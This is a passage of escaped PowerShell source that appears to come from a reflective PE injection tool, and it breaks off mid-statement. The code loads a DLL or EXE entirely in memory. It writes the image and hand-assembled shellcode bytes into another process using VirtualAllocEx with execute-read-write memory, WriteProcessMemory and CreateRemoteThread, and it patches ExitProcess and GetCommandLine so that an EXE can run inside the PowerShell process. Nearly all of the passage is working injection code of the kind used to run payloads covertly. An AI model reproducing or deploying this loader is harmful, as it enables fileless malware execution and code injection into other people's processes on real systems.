\u00a0\u00a0\u00a0#Copy each section from the PE in to memory\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Copy PE sections in to memory\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Copy-Sections -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Update memory addresses based on where the PE was actually loaded in memory\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#The PE we are in-memory loading has DLLs it needs, import those DLLs for it\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Import DLL's needed by the PE we are loading\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RemoteLoading -eq $true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Update the memory protection flags for all the memory just allocated\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RemoteLoading -eq $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($NXCompatible -eq $true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Update memory protection flags\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"PE being loaded in to a remote process, not adjusting memory permissions\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#If remote loading, copy the DLL in to remote process memory\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RemoteLoading -eq $true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt32]$NumBytesWritten = 0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Success -eq $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unable to write shellcode to remote process memory.\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($PEInfo.FileType -ieq \"DLL\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RemoteLoading -eq $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Calling dllmain so the DLL knows it has been loaded\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($PEInfo.PE64Bit -eq $true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Shellcode: CallDllMain.asm\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Shellcode: CallDllMain.asm\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCPSMemOriginal = $SCPSMem\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RSCAddr -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unable to allocate memory in the remote process for shellcode\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unable to write shellcode to remote process memory.\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Result -ne 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Call to CreateRemoteThread to call GetProcAddress failed.\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0elseif ($PEInfo.FileType -ieq \"EXE\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in.\"\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEBytes = $null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Host 'Executing...'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[GC]::Collect()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0while($true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($ThreadDone -eq 1)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0break\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Start-Sleep -Seconds 1\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return @($PEInfo.PEHandle, $EffectivePEHandle)\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0Function Invoke-MemoryFreeLibrary\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position=0, Mandatory=$true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEHandle\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Get Win32 constants and functions\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants = Get-Win32Constants\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions = Get-Win32Functions\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types = Get-Win32Types\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Call FreeLibrary for all the imports of the DLL\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0while ($true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#If the structure is null, it signals that this is the end of the array\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($ImportDescriptor.Characteristics -eq 0 `\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0-and $ImportDescriptor.FirstThunk -eq 0 `\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0-and $ImportDescriptor.ForwarderChain -eq 0 `\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0-and $ImportDescriptor.Name -eq 0 `\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0-and $ImportDescriptor.TimeDateStamp -eq 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose 